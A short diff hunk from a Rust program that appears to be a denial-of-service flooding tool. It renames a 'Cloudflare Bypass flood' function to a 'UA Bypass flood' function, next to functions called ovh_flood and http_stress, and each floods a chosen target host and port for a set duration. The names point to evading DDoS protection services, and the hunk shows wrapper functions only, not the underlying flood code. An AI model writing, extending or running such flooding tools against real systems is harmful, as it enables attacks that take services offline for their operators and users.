@@ -395,8 +395,8 @@ pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) {
     println!("Starting OVH Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
     udp_smart(target, port, duration_secs).await;
 }
-pub async fn cf_bypass_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting Cloudflare Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
+pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting UA Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
     http_flood(target, port, duration_secs).await;
 }
 pub async fn http_stress(target: &str, port: u16, duration_secs: u64) {
